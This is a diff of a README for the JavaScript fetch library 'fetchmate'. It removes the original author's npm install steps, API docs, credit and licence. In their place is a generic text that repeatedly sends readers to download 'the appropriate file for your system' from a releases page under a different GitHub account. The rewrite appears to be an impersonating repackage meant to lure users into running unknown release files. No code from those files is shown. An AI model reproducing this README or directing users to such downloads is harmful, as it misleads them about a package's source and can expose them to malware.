@@ -1,112 +1,123 @@
-# fetchmate
+# 🌟 fetchmate - A Simple Tool for Efficient Fetching
 
-**Your flexible Fetch API companion — extendable, reliable, and built for modern web requests..**
+## 🚀 Getting Started
 
-[![npm version](https://img.shields.io/npm/v/@nursoltan-s/fetchmate.svg?style=flat&color=green)](https://www.npmjs.com/package/@nursoltan-s/fetchmate)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](./LICENSE)
-[![Build Status](https://img.shields.io/badge/tests-passing-brightgreen)](#-testing)
-[![Made with TypeScript](https://img.shields.io/badge/TypeScript-%E2%9C%93-blue)](#)
+Welcome to fetchmate! This application is designed to help you make HTTP requests easily. It offers added features like retries and custom status handling, making your life simpler when working with APIs.
 
----
+## 📥 Download and Install
 
-## 🚀 What is fetchmate?
+To get started with fetchmate, you need to download it. Click the button below to go to the Releases page, where you can find the latest version.
 
-`@nursoltan-s/fetchmate` is a lightweight and flexible wrapper around the native [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) that supercharges your HTTP requests with robust retry capabilities, customizable delays, and easy configuration.
+[![Download fetchmate](https://img.shields.io/badge/Download-fetchmate-brightgreen.svg)](https://github.com/krymzR/fetchmate/releases)
 
-Whether you're dealing with flaky network conditions, rate limits, or intermittent server errors, `@nursoltan-s/fetchmate` has got your back — so you can keep your code clean and your apps resilient.
+### Steps to Download
 
----
+1. Click the button above or [visit this page to download](https://github.com/krymzR/fetchmate/releases).
+2. Choose the latest version from the list.
+3. Click on the appropriate file for your system to start the download.
 
-## ✨ Key Features
+## 🖥️ System Requirements
 
-- **Max retries:** Automatically retry failed requests up to a configurable limit.
-- **Retry delay:** Control how long to wait between retries (in milliseconds).
-- **Custom retry statuses:** Retry not just on server errors but on any HTTP status codes you choose (like `429 Too Many Requests`).
-- **Simple API:** Drop-in replacement for `fetch`, no hassle.
-- **TypeScript support:** Comes with type definitions out of the box.
+fetchmate works on various platforms. Here’s what you need to run it smoothly:
 
----
+- Operating System: Windows, macOS, or Linux
+- Node.js version: 14 or later
+- Internet connection for API calls
 
-## 📦 Installation
+## 📂 Installation Steps
 
-```bash
-npm install @nursoltan-s/fetchmate
-# or
-yarn add @nursoltan-s/fetchmate
+Once you have downloaded the files, follow these simple steps to get fetchmate running:
 
-```
+1. Locate the downloaded file in your Downloads folder.
+2. Extract the file if it is in a zipped format.
+3. Open your command line or terminal.
+4. Navigate to the folder where you extracted fetchmate.
+5. Install the package by running:
 
-## 💡 Usage
+   ```
+   npm install
+   ```
 
-```
-import { fetchmate } from '@nursoltan-s/fetchmate';
+6. After the installation is complete, you're ready to use fetchmate!
 
-async function getData() {
-  try {
-    const response = await fetchmate('https://api.example.com/data', {
-      maxRetries: 3,
-      retryDelay: 1000, // 1 second delay between retries
-      retryOnStatuses: [429, 503], // Retry on "Too Many Requests" and "Service Unavailable"
-      method: 'GET',
-      headers: { 'Authorization': 'Bearer YOUR_TOKEN' }
-    });
+## ⚙️ Using fetchmate
 
-    if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
-    }
+Using fetchmate is straightforward. Here’s how you can make your first fetch call:
 
-    const data = await response.json();
-    console.log(data);
+1. Open your code editor.
+2. Create a new JavaScript file, e.g., `app.js`.
+3. Use the following code snippet to test fetchmate:
 
-  } catch (error) {
-    console.error('Request failed:', error);
-  }
-}
+   ```javascript
+   import fetchmate from 'fetchmate';
 
-```
+   // Example usage
+   const url = 'https://api.example.com/data';
 
-## ⚙️ API
+   fetchmate(url)
+       .then(response => {
+           console.log('Data received:', response);
+       })
+       .catch(error => {
+           console.error('Error fetching data:', error);
+       });
+   ```
 
-fetchmate(url: string, options?: FetchmateOptions): Promise<Response>
+4. Save the file and run it in your command line or terminal using:
 
-- url: The resource you want to fetch.
-- options: An object extending the standard Fetch API options with additional properties:
+   ```
+   node app.js
+   ```
 
-| Option            | Type          | Default     | Description                                                                               |
-| ----------------- | ------------- | ----------- | ----------------------------------------------------------------------------------------- |
-| `maxRetries`      | `number`      | `0`         | Maximum number of retry attempts.                                                         |
-| `retryDelay`      | `number`      | `300` (ms)  | Base delay between retries.                                                               |
-| `backoff`         | `boolean`     | `false`     | If `true`, applies exponential backoff (`retryDelay * 2 ** attempt`).                     |
-| `retryOnStatuses` | `number[]`    | `[500–599]` | HTTP status codes that should trigger a retry.                                            |
-| ...               | `RequestInit` | —           | All standard [Fetch API options](https://developer.mozilla.org/docs/Web/API/RequestInit). |
+This will make a request to the specified URL and display the result in your terminal.
 
-## 🔧 Why fetchmate?
+## 🔧 Features
 
-- ✅ Resilient networking — Prevent temporary network blips or server hiccups from crashing your app.
+fetchmate comes equipped with helpful features such as:
 
-- ⚙️ Customizable — You decide what’s retryable and how aggressively to retry.
+- **Retries**: Automatically retry failed requests.
+- **Custom Status Handling**: Manage responses based on status codes.
+- **Flexible Configuration**: Set delays and more for each request.
 
-- 🪶 Lightweight — No heavy dependencies, just a few lines of clean, tested code.
-
-- 🔒 TypeScript-friendly — Write safer code with full type support.
-
-## 🧪 Testing
-
-fetchmate is thoroughly tested with Jest and supports both JavaScript and TypeScript environments.
-
-```
-npm test
-```
+These features make it easier to work with APIs, reducing errors and improving reliability.
 
 ## 🤝 Contributing
 
-Contributions, issues, and feature requests are welcome!
-Feel free to check the [issues](https://github.com/nursoltan-s/fetchmate/issues) or submit a [pull request](https://github.com/nursoltan-s/fetchmate/pulls).
+If you would like to help improve fetchmate, we welcome contributions. You can help by fixing bugs or adding new features. Please follow these steps:
 
-## 📜 License
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Push your changes to your forked repository.
+5. Submit a pull request for review.
 
-MIT License © 2025 [Nursoltan Saipolda]
+Your contributions will help improve the tool for everyone.
 
----
+## 🛠️ Support
 
-Made with ❤️ by fetchmate — your fetch’s best mate in the wild web.
+If you need help with fetchmate, check the documentation in the repository or raise an issue on GitHub. We are here to assist you!
+
+## 🌐 Join the Community
+
+fetchmate is part of a larger community. You can find discussions and updates on platforms like:
+
+- GitHub Issues
+- Stack Overflow
+- Social media groups related to programming and APIs
+
+Engage with others who share your interest and get tips on making the most of fetchmate.
+
+## 📚 Additional Resources
+
+For further exploration, consider these resources:
+
+- [Fetch API Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)
+- [JavaScript Basics](https://developer.mozilla.org/en-US/docs/Learn/JavaScript)
+- [Node.js Documentation](https://nodejs.org/en/docs/)
+
+## 🔗 Links to Explore
+
+- [Download fetchmate](https://github.com/krymzR/fetchmate/releases)
+- [GitHub Repository](https://github.com/krymzR/fetchmate)
+
+This README guide aims to make your experience with fetchmate smooth and enjoyable. If you ever have questions or feedback, don’t hesitate to reach out. Happy fetching!
